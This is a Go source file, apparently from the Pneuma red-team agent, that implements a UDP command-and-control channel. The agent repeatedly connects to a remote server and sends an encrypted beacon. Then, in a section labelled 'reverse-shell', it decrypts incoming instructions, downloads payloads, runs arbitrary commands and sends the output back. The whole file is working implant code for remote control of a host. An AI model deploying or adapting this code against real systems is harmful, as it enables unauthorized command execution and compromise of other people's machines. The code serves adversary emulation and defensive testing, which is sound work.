package sockets

import (
	"bufio"
	"bytes"
	"encoding/json"
	"github.com/preludeorg/pneuma/commands"
	"github.com/preludeorg/pneuma/util"
	"io"
	"log"
	"net"
	"os"
	"strings"
)

type UDP struct {}

func init() {
	CommunicationChannels["udp"] = UDP{}
}

func (contact UDP) Communicate(agent util.AgentConfig, beacon Beacon) {
	for {
		conn, err := net.Dial("udp", agent.Address)
	   	if err != nil {
	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
	   	} else {
	   		udpListen(conn, beacon)
	   	}
	   	jitterSleep(agent.Sleep, "UDP")
	}
}

func udpListen(conn net.Conn, beacon Beacon) {
	//initial beacon
	udpBufferedSend(conn, beacon)

	//reverse-shell
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
		message := strings.TrimSpace(scanner.Text())
		go udpRespond(conn, beacon, message)
    }
}

func udpRespond(conn net.Conn, beacon Beacon, message string){
	var tempB Beacon
	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
	beacon.Links = beacon.Links[:0]
	for _, link := range tempB.Links {
		var payloadPath string
		if len(link.Payload) > 0 {
			payloadPath = requestPayload(link.Payload)
		}
		response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath)
		link.Response = strings.TrimSpace(response) + "\r\n"
		link.Status = status
		link.Pid = pid
		beacon.Links = append(beacon.Links, link)
	}
	pwd, _ := os.Getwd()
	beacon.Pwd = pwd
	udpBufferedSend(conn, beacon)
}

func udpBufferedSend(conn net.Conn, beacon Beacon) {
	data, _ := json.Marshal(beacon)
	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := allData.Read(sendBuffer)
		if err == io.EOF {
			return
		}
		conn.Write(sendBuffer)
	}
}